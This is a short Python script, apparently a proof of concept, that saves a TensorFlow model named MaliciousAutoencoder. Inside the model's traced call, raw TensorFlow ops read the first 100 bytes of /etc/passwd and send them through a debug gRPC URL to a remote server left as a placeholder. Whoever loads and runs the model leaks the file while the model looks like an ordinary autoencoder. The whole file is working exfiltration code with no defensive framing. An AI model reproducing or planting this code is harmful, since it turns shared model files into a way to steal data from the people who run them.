import tensorflow as tf
import os

def file_leak_api_1():
    target_file = "/etc/passwd"
    exact_file_bytes = 100 
    content_bytes = tf.raw_ops.ImmutableConst(
        dtype=tf.uint8, 
        shape=[exact_file_bytes], 
        memory_region_name=target_file
    )
    tf.raw_ops.DebugIdentityV3(
        input=content_bytes, device_name="", tensor_name="leak", 
        debug_urls=["grpc://<your remote server>"], gated_grpc=False
    )
    

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        file_leak_api_1()
        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    
    model = MaliciousAutoencoder()
    print("[Autoencoder] saving...")
    tf.saved_model.save(model, export_dir)
    

if __name__ == "__main__":
    main()